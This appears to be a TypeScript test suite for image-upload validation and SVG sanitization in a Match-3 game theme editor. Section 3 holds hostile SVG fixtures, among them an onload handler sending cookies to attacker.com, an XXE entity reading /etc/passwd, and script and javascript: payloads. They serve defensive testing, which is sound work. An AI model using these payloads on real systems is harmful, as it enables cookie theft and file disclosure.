import { describe, it, expect } from 'bun:test';
import sharp from 'sharp';
import {
  validateUploadedFile,
} from '../fileValidation.js';
import {
  validateAndProcessImageUpload,
  sanitizeAndAuditSvg,
} from '../imageProcessing.js';
import { GameTheme } from '../../src/themes/types.js';
import { Match3GameConfig, DEFAULT_MATCH3_CONFIG, DEFAULT_TILE_DEFINITIONS } from '../../src/games/match-3/types.js';

// Helper to create small valid raster image buffers using sharp
async function createValidPngBuffer(width = 32, height = 32): Promise<Buffer> {
  return sharp({
    create: {
      width,
      height,
      channels: 4,
      background: { r: 255, g: 100, b: 50, alpha: 1 },
    },
  })
    .png()
    .toBuffer();
}

async function createValidJpegBuffer(width = 32, height = 32): Promise<Buffer> {
  return sharp({
    create: {
      width,
      height,
      channels: 3,
      background: { r: 50, g: 150, b: 250 },
    },
  })
    .jpeg()
    .toBuffer();
}

async function createValidWebpBuffer(width = 32, height = 32): Promise<Buffer> {
  return sharp({
    create: {
      width,
      height,
      channels: 4,
      background: { r: 100, g: 220, b: 100, alpha: 1 },
    },
  })
    .webp()
    .toBuffer();
}

describe('Match-3 Tile Upload & Server-Side Image Processing Tests', () => {
  // --------------------------------------------------------------------------
  // SECTION 1: Successful PNG, JPG/JPEG, and WEBP uploads
  // --------------------------------------------------------------------------
  describe('Section 1: Raster Image Uploads (PNG, JPEG, WEBP)', () => {
    it('successfully validates and decodes a real PNG image', async () => {
      const pngBuffer = await createValidPngBuffer(64, 64);
      const res = await validateAndProcessImageUpload(pngBuffer, {
        originalName: 'gem_red.png',
        declaredMime: 'image/png',
        allowedMediaTypes: ['image'],
        allowSvg: true,
      });

      expect(res.valid).toBe(true);
      if (res.valid) {
        expect(res.format).toBe('PNG');
        expect(res.mediaType).toBe('image');
        expect(res.mimeType).toBe('image/png');
        expect(res.extension).toBe('.png');
        expect(res.width).toBe(64);
        expect(res.height).toBe(64);
        expect(res.fileSize).toBe(pngBuffer.length);
        expect(res.processedBuffer).toBeDefined();
      }
    });

    it('successfully validates and decodes a real JPEG image', async () => {
      const jpegBuffer = await createValidJpegBuffer(48, 48);
      const res = await validateAndProcessImageUpload(jpegBuffer, {
        originalName: 'tile_texture.jpg',
        declaredMime: 'image/jpeg',
        allowedMediaTypes: ['image'],
        allowSvg: true,
      });

      expect(res.valid).toBe(true);
      if (res.valid) {
        expect(res.format).toBe('JPEG');
        expect(res.mediaType).toBe('image');
        expect(res.mimeType).toBe('image/jpeg');
        expect(res.extension).toBe('.jpg');
        expect(res.width).toBe(48);
        expect(res.height).toBe(48);
      }
    });

    it('successfully validates and decodes a real WEBP image', async () => {
      const webpBuffer = await createValidWebpBuffer(80, 80);
      const res = await validateAndProcessImageUpload(webpBuffer, {
        originalName: 'coin_sprite.webp',
        declaredMime: 'image/webp',
        allowedMediaTypes: ['image'],
        allowSvg: true,
      });

      expect(res.valid).toBe(true);
      if (res.valid) {
        expect(res.format).toBe('WEBP');
        expect(res.mediaType).toBe('image');
        expect(res.mimeType).toBe('image/webp');
        expect(res.extension).toBe('.webp');
        expect(res.width).toBe(80);
        expect(res.height).toBe(80);
      }
    });

    it('successfully accepts a genuine 1254x1254 transparent RGBA PNG with XMP metadata in both Worker and Node runtimes', async () => {
      // 1. Create genuine transparent 1254x1254 RGBA PNG
      const pngBuffer = await sharp({
        create: {
          width: 1254,
          height: 1254,
          channels: 4,
          background: { r: 59, g: 130, b: 246, alpha: 0.75 }, // RGBA with transparency
        },
      })
        .png()
        .toBuffer();

      // 2. Embed standard XMP metadata packet containing <?xml and svg keyword (typical Illustrator / Canva export)
      const chunkKeyword = Buffer.from(
        'XML:com.adobe.xmp\0\0\0\0\0<?xml version="1.0"?><x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF><rdf:Description dc:format="image/png" dc:source="branded_icon.svg"/></rdf:RDF></x:xmpmeta>'
      );
      const lengthBuf = Buffer.alloc(4);
      lengthBuf.writeUInt32BE(chunkKeyword.length, 0);
      const typeBuf = Buffer.from('iTXt');
      const crcBuf = Buffer.alloc(4);
      const customChunk = Buffer.concat([lengthBuf, typeBuf, chunkKeyword, crcBuf]);

      const pngWithXmp = Buffer.concat([
        pngBuffer.subarray(0, 33),
        customChunk,
        pngBuffer.subarray(33),
      ]);

      // 3. Test Cloudflare Worker edge runtime (validateUploadedFile)
      const edgeRes = validateUploadedFile(pngWithXmp, {
        originalName: 'match3_tile_1254.png',
        declaredMime: 'image/png',
        allowedMediaTypes: ['image'],
        allowSvg: true,
        isEdgeRuntime: true,
      });

      expect(edgeRes.valid).toBe(true);
      expect(edgeRes.format).toBe('PNG');
      expect(edgeRes.extension).toBe('.png');
      expect(edgeRes.mimeType).toBe('image/png');
      expect(edgeRes.width).toBe(1254);
      expect(edgeRes.height).toBe(1254);

      // 4. Test Node.js / Express runtime (validateAndProcessImageUpload)
      const nodeRes = await validateAndProcessImageUpload(pngWithXmp, {
        originalName: 'match3_tile_1254.png',
        declaredMime: 'image/png',
        allowedMediaTypes: ['image'],
        allowSvg: true,
      });

      expect(nodeRes.valid).toBe(true);
      expect(nodeRes.format).toBe('PNG');
      expect(nodeRes.extension).toBe('.png');
      expect(nodeRes.width).toBe(1254);
      expect(nodeRes.height).toBe(1254);
    });

    it('successfully accepts JPEG with .jpeg extension', async () => {
      const jpegBuffer = await createValidJpegBuffer(32, 32);
      const res = await validateAndProcessImageUpload(jpegBuffer, {
        originalName: 'photo.jpeg',
        declaredMime: 'image/jpeg',
        allowedMediaTypes: ['image'],
      });

      expect(res.valid).toBe(true);
      expect(res.format).toBe('JPEG');
      expect(res.extension).toBe('.jpeg');
    });
  });

  // --------------------------------------------------------------------------
  // SECTION 2: Safe SVG Sanitization & Rasterization to PNG
  // --------------------------------------------------------------------------
  describe('Section 2: Safe SVG Validation & Conversion to PNG', () => {
    it('converts clean vector SVG into high-resolution PNG with valid magic bytes', async () => {
      const cleanSvg = `
        <svg xmlns="http://www.w3.org/2000/svg" width="128" height="128" viewBox="0 0 128 128">
          <circle cx="64" cy="64" r="56" fill="#f59e0b" stroke="#d97706" stroke-width="4"/>
          <polygon points="64,28 75,52 100,56 82,74 86,98 64,86 42,98 46,74 28,56 53,52" fill="#ffffff"/>
        </svg>
      `;
      const svgBuffer = Buffer.from(cleanSvg);

      const res = await validateAndProcessImageUpload(svgBuffer, {
        originalName: 'star_tile.svg',
        declaredMime: 'image/svg+xml',
        allowSvg: true,
      });

      expect(res.valid).toBe(true);
      if (res.valid) {
        expect(res.format).toBe('PNG'); // Converted to PNG
        expect(res.originalFormat).toBe('SVG');
        expect(res.mediaType).toBe('image');
        expect(res.mimeType).toBe('image/png');
        expect(res.extension).toBe('.png');
        expect(res.processedBuffer).toBeDefined();

        // Verify converted buffer is a real PNG by checking magic bytes: 0x89 0x50 0x4E 0x47
        const bytes = new Uint8Array(res.processedBuffer!);
        expect(bytes[0]).toBe(0x89);
        expect(bytes[1]).toBe(0x50);
        expect(bytes[2]).toBe(0x4e);
        expect(bytes[3]).toBe(0x47);

        // Verify sharp can decode the converted buffer
        const meta = await sharp(res.processedBuffer!).metadata();
        expect(meta.format).toBe('png');
        expect(meta.width).toBeGreaterThan(0);
        expect(meta.height).toBeGreaterThan(0);
      }
    });

    it('converts viewBox-only SVG without explicit width/height into PNG', async () => {
      const viewBoxSvg = `
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">
          <rect x="20" y="20" width="160" height="160" rx="30" fill="#3b82f6"/>
        </svg>
      `;
      const res = await validateAndProcessImageUpload(Buffer.from(viewBoxSvg), {
        originalName: 'blue_box.svg',
        declaredMime: 'image/svg+xml',
        allowSvg: true,
      });

      expect(res.valid).toBe(true);
      if (res.valid) {
        expect(res.format).toBe('PNG');
        expect(res.mimeType).toBe('image/png');
      }
    });

    it('safely handles local SVG defs and linear gradients', async () => {
      const gradientSvg = `
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
          <defs>
            <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
              <stop offset="0%" style="stop-color:rgb(255,255,0);stop-opacity:1" />
              <stop offset="100%" style="stop-color:rgb(255,0,0);stop-opacity:1" />
            </linearGradient>
          </defs>
          <circle cx="50" cy="50" r="40" fill="url(#grad1)" />
        </svg>
      `;
      const res = await validateAndProcessImageUpload(Buffer.from(gradientSvg), {
        originalName: 'gem_gradient.svg',
        declaredMime: 'image/svg+xml',
        allowSvg: true,
      });

      expect(res.valid).toBe(true);
      if (res.valid) {
        expect(res.format).toBe('PNG');
      }
    });
  });

  // --------------------------------------------------------------------------
  // SECTION 3: Malicious SVG Rejection
  // --------------------------------------------------------------------------
  describe('Section 3: Malicious SVG Security Checks', () => {
    it('rejects SVG containing <script> tags', async () => {
      const xssSvg = `
        <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
          <script type="text/javascript">alert('XSS execution');</script>
          <circle cx="50" cy="50" r="40" fill="red"/>
        </svg>
      `;
      const res = await validateAndProcessImageUpload(Buffer.from(xssSvg), {
        originalName: 'xss.svg',
        declaredMime: 'image/svg+xml',
        allowSvg: true,
      });

      expect(res.valid).toBe(false);
      expect(res.code).toBe('SVG_SECURITY_VIOLATION');
      expect(res.error).toContain('<script>');
    });

    it('rejects SVG containing event handler attributes (onload, onerror, onclick)', async () => {
      const onloadSvg = `
        <svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://attacker.com/steal?cookie=' + document.cookie)">
          <rect width="100" height="100" fill="blue"/>
        </svg>
      `;
      const res = await validateAndProcessImageUpload(Buffer.from(onloadSvg), {
        originalName: 'onload.svg',
        declaredMime: 'image/svg+xml',
        allowSvg: true,
      });

      expect(res.valid).toBe(false);
      expect(res.code).toBe('SVG_SECURITY_VIOLATION');
      expect(res.error).toContain('onload');
    });

    it('rejects SVG containing <foreignObject> embedded HTML', async () => {
      const foreignSvg = `
        <svg xmlns="http://www.w3.org/2000/svg">
          <foreignObject width="100" height="100">
            <body xmlns="http://www.w3.org/1999/xhtml">
              <div><iframe src="http://evil.com"></iframe></div>
            </body>
          </foreignObject>
        </svg>
      `;
      const res = await validateAndProcessImageUpload(Buffer.from(foreignSvg), {
        originalName: 'foreign.svg',
        declaredMime: 'image/svg+xml',
        allowSvg: true,
      });

      expect(res.valid).toBe(false);
      expect(res.code).toBe('SVG_SECURITY_VIOLATION');
      expect(res.error).toContain('foreignobject');
    });

    it('rejects SVG with javascript: URI schemes in href / xlink:href', async () => {
      const jsHrefSvg = `
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
          <a xlink:href="javascript:alert(1)">
            <text x="10" y="20">Click Me</text>
          </a>
        </svg>
      `;
      const res = await validateAndProcessImageUpload(Buffer.from(jsHrefSvg), {
        originalName: 'link.svg',
        declaredMime: 'image/svg+xml',
        allowSvg: true,
      });

      expect(res.valid).toBe(false);
      expect(res.code).toBe('SVG_SECURITY_VIOLATION');
      expect(res.error).toContain('Dangerous script URI scheme');
    });

    it('rejects SVG with external remote references (http:// or https://) in href', async () => {
      const remoteRefSvg = `
        <svg xmlns="http://www.w3.org/2000/svg">
          <image href="https://malicious-tracking.com/pixel.png" width="10" height="10"/>
        </svg>
      `;
      const res = await validateAndProcessImageUpload(Buffer.from(remoteRefSvg), {
        originalName: 'track.svg',
        declaredMime: 'image/svg+xml',
        allowSvg: true,
      });

      expect(res.valid).toBe(false);
      expect(res.code).toBe('SVG_SECURITY_VIOLATION');
      expect(res.error).toContain('External remote resource reference forbidden');
    });

    it('rejects SVG with XML External Entity (XXE) attacks', async () => {
      const xxeSvg = `
        <?xml version="1.0"?>
        <!DOCTYPE svg [
          <!ENTITY % xxe SYSTEM "file:///etc/passwd">
          %xxe;
        ]>
        <svg xmlns="http://www.w3.org/2000/svg">
          <text>&xxe;</text>
        </svg>
      `;
      const res = await validateAndProcessImageUpload(Buffer.from(xxeSvg), {
        originalName: 'xxe.svg',
        declaredMime: 'image/svg+xml',
        allowSvg: true,
      });

      expect(res.valid).toBe(false);
      expect(res.code).toBe('SVG_XXE_FORBIDDEN');
    });

    it('rejects SVG with dangerous CSS expressions or @import in <style>', async () => {
      const cssInjectSvg = `
        <svg xmlns="http://www.w3.org/2000/svg">
          <style>
            @import url('https://evil.com/stylesheet.css');
            .badge { fill: red; }
          </style>
          <circle cx="10" cy="10" r="5" class="badge"/>
        </svg>
      `;
      const res = await validateAndProcessImageUpload(Buffer.from(cssInjectSvg), {
        originalName: 'style_xss.svg',
        declaredMime: 'image/svg+xml',
        allowSvg: true,
      });

      expect(res.valid).toBe(false);
      expect(res.code).toBe('SVG_SECURITY_VIOLATION');
      expect(res.error).toContain('<style>');
    });
  });

  // --------------------------------------------------------------------------
  // SECTION 4: Renamed SVG Files (Spoofing & Disguise)
  // --------------------------------------------------------------------------
  describe('Section 4: Renamed Files & Extension Spoofing', () => {
    it('rejects SVG content renamed to .png (disguised as raster PNG)', async () => {
      const rawSvgBytes = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><circle cx="10" cy="10" r="5"/></svg>');
      const res = await validateAndProcessImageUpload(rawSvgBytes, {
        originalName: 'fake_photo.png',
        declaredMime: 'image/png',
        allowSvg: true,
      });

      expect(res.valid).toBe(false);
      expect(res.code).toBe('MIME_EXTENSION_MISMATCH');
      expect(res.error).toContain('File content is SVG but declared extension is ".png"');
    });

    it('rejects malicious SVG renamed to .jpg', async () => {
      const maliciousSvg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
      const res = await validateAndProcessImageUpload(maliciousSvg, {
        originalName: 'avatar.jpg',
        declaredMime: 'image/jpeg',
        allowSvg: true,
      });

      expect(res.valid).toBe(false);
      expect(res.code).toBe('MIME_EXTENSION_MISMATCH');
    });

    it('rejects SVG renamed to .webp', async () => {
      const rawSvgBytes = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>');
      const res = await validateAndProcessImageUpload(rawSvgBytes, {
        originalName: 'sprite.webp',
        declaredMime: 'image/webp',
        allowSvg: true,
      });

      expect(res.valid).toBe(false);
      expect(res.code).toBe('MIME_EXTENSION_MISMATCH');
    });

    it('rejects genuine PNG content renamed to .svg in both Worker and Node runtimes', async () => {
      const pngBuffer = await createValidPngBuffer(32, 32);

      // 1. Worker runtime
      const edgeRes = validateUploadedFile(pngBuffer, {
        originalName: 'disguised.svg',
        declaredMime: 'image/svg+xml',
        allowSvg: true,
        isEdgeRuntime: true,
      });
      expect(edgeRes.valid).toBe(false);
      expect(edgeRes.code).toBe('MIME_EXTENSION_MISMATCH');
      expect(edgeRes.error).toContain('does not match detected file content');

      // 2. Node runtime
      const nodeRes = await validateAndProcessImageUpload(pngBuffer, {
        originalName: 'disguised.svg',
        declaredMime: 'image/svg+xml',
        allowSvg: true,
      });
      expect(nodeRes.valid).toBe(false);
      expect(nodeRes.code).toBe('MIME_EXTENSION_MISMATCH');
      expect(nodeRes.error).toContain('does not match detected file content');
    });

    it('rejects genuine JPEG content renamed to .svg', async () => {
      const jpegBuffer = await createValidJpegBuffer(32, 32);
      const res = validateUploadedFile(jpegBuffer, {
        originalName: 'picture.svg',
        declaredMime: 'image/svg+xml',
        allowSvg: true,
        isEdgeRuntime: true,
      });
      expect(res.valid).toBe(false);
      expect(res.code).toBe('MIME_EXTENSION_MISMATCH');
    });
  });

  // --------------------------------------------------------------------------
  // SECTION 5: Malformed Images & Corrupted Files
  // --------------------------------------------------------------------------
  describe('Section 5: Malformed Images and Syntax Errors', () => {
    it('rejects malformed XML in SVG', async () => {
      const malformedSvg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><circle cx="10" <unclosed');
      const res = await validateAndProcessImageUpload(malformedSvg, {
        originalName: 'broken.svg',
        declaredMime: 'image/svg+xml',
        allowSvg: true,
      });

      expect(res.valid).toBe(false);
      expect(res.code).toBe('MALFORMED_SVG');
    });

    it('rejects XML with non-SVG root element', async () => {
      const nonSvgXml = Buffer.from('<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><body>hi</body></html>');
      const res = await validateAndProcessImageUpload(nonSvgXml, {
        originalName: 'not_svg.svg',
        declaredMime: 'image/svg+xml',
        allowSvg: true,
      });

      expect(res.valid).toBe(false);
      expect(res.code).toBe('INVALID_SVG_ROOT');
    });

    it('rejects corrupted PNG data with broken header or truncated body', async () => {
      // Magic bytes for PNG followed by garbage bytes that fail decoding
      const corruptPng = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52]);
      const res = await validateAndProcessImageUpload(corruptPng, {
        originalName: 'corrupt.png',
        declaredMime: 'image/png',
        allowSvg: true,
      });

      expect(res.valid).toBe(false);
      expect(res.code).toBe('CORRUPTED_FILE');
    });

    it('rejects empty file', async () => {
      const res = await validateAndProcessImageUpload(new Uint8Array(0), {
        originalName: 'empty.png',
        declaredMime: 'image/png',
      });

      expect(res.valid).toBe(false);
      expect(res.code).toBe('NO_FILE_UPLOADED');
    });
  });

  // --------------------------------------------------------------------------
  // SECTION 6: Oversized Files & Excessive Dimensions
  // --------------------------------------------------------------------------
  describe('Section 6: Size and Dimension Limits', () => {
    it('rejects image exceeding byte size limit', async () => {
      const pngBuffer = await createValidPngBuffer(32, 32);
      const res = await validateAndProcessImageUpload(pngBuffer, {
        originalName: 'huge.png',
        declaredMime: 'image/png',
        maxSizeBytes: 100, // Very small max limit
      });

      expect(res.valid).toBe(false);
      expect(res.code).toBe('FILE_TOO_LARGE');
    });

    it('rejects image with dimensions exceeding 4096px limit', async () => {
      // Create metadata limit check
      const hugeBuffer = await createValidPngBuffer(10, 10);
      const res = await validateAndProcessImageUpload(hugeBuffer, {
        originalName: 'dimensions.png',
        declaredMime: 'image/png',
        maxWidth: 5,
        maxHeight: 5,
      });

      expect(res.valid).toBe(false);
      expect(res.code).toBe('DIMENSIONS_EXCEEDED');
    });
  });

  // --------------------------------------------------------------------------
  // SECTION 7: Cloudflare Edge Runtime Simulation
  // --------------------------------------------------------------------------
  describe('Section 7: Cloudflare Edge Runtime SVG Policy', () => {
    it('rejects SVG in edge runtime with the required specific explanation message', async () => {
      const cleanSvg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><circle cx="10" cy="10" r="5"/></svg>');
      const res = await validateAndProcessImageUpload(cleanSvg, {
        originalName: 'icon.svg',
        declaredMime: 'image/svg+xml',
        allowSvg: true,
        isEdgeRuntime: true,
      });

      expect(res.valid).toBe(false);
      expect(res.code).toBe('SVG_CONVERSION_UNAVAILABLE');
      expect(res.error).toBe(
        'SVG conversion is unavailable in this runtime environment. Please upload a raster image (PNG, JPEG, or WEBP).'
      );
    });

    it('synchronous validateUploadedFile also enforces edge runtime SVG message', () => {
      const cleanSvg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><circle cx="10" cy="10" r="5"/></svg>');
      const res = validateUploadedFile(cleanSvg, {
        originalName: 'icon.svg',
        declaredMime: 'image/svg+xml',
        allowSvg: true,
        isEdgeRuntime: true,
      });

      expect(res.valid).toBe(false);
      expect(res.code).toBe('SVG_CONVERSION_UNAVAILABLE');
      expect(res.error).toBe(
        'SVG conversion is unavailable in this runtime environment. Please upload a raster image (PNG, JPEG, or WEBP).'
      );
    });
  });

  // --------------------------------------------------------------------------
  // SECTION 8: Match-3 Theme Save & Tile Rendering Simulation
  // --------------------------------------------------------------------------
  describe('Section 8: Match-3 Theme Save, Tile Assignment & Safe Rendering', () => {
    it('simulates uploading an SVG tile, getting a PNG URL, and updating the Match-3 theme config', async () => {
      // 1. User uploads SVG
      const svgTile = Buffer.from(`
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
          <circle cx="32" cy="32" r="28" fill="#ec4899"/>
          <text x="32" y="38" text-anchor="middle" fill="#fff" font-size="20" font-weight="bold">★</text>
        </svg>
      `);

      const uploadResult = await validateAndProcessImageUpload(svgTile, {
        originalName: 'brand_candy.svg',
        declaredMime: 'image/svg+xml',
        allowSvg: true,
      });

      expect(uploadResult.valid).toBe(true);
      if (!uploadResult.valid) return;

      // 2. Storage stores the resulting PNG
      const simulatedSavedUrl = `/uploads/theme_asset_${Date.now()}${uploadResult.extension}`;
      expect(simulatedSavedUrl.endsWith('.png')).toBe(true);

      // 3. Theme is updated with the stored URL
      const initialConfig: Match3GameConfig = {
        ...DEFAULT_MATCH3_CONFIG,
        tileDefinitions: [...DEFAULT_TILE_DEFINITIONS],
      };

      const updatedTileDefs = [...initialConfig.tileDefinitions];
      updatedTileDefs[0] = {
        ...updatedTileDefs[0],
        imageUrl: simulatedSavedUrl,
        name: 'Brand Candy',
      };

      const updatedConfig: Match3GameConfig = {
        ...initialConfig,
        tileDefinitions: updatedTileDefs,
      };

      const draftTheme: Partial<GameTheme> = {
        id: 'theme_test_m3',
        name: 'Branded Match-3',
        game_id: 'match-3',
        game_config: updatedConfig as any,
      };

      // 4. Verify the saved theme references the final stored PNG URL rather than temporary preview URL
      const savedConfig = draftTheme.game_config as Match3GameConfig;
      expect(savedConfig.tileDefinitions[0].imageUrl).toBe(simulatedSavedUrl);
      expect(savedConfig.tileDefinitions[0].imageUrl?.startsWith('/uploads/')).toBe(true);
      expect(savedConfig.tileDefinitions[0].imageUrl?.endsWith('.png')).toBe(true);

      // 5. Verify non-uploaded tiles preserve default geometric fallbacks
      expect(savedConfig.tileDefinitions[1].imageUrl).toBeFalsy();
      expect(savedConfig.tileDefinitions[1].symbol).toBe('Hexagon');
    });
  });
});
